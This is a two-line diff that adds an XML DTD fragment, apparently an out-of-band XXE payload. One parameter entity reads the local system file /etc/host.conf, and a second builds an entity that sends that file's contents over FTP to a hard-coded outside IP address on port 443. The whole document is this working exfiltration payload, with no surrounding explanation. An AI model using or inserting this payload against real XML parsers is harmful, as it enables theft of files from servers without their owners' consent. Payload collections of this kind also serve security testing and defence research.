@@ -1,0 +1,2 @@
+<!ENTITY % d SYSTEM "file:///etc/host.conf">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://45.79.111.109:443/%d;'>">
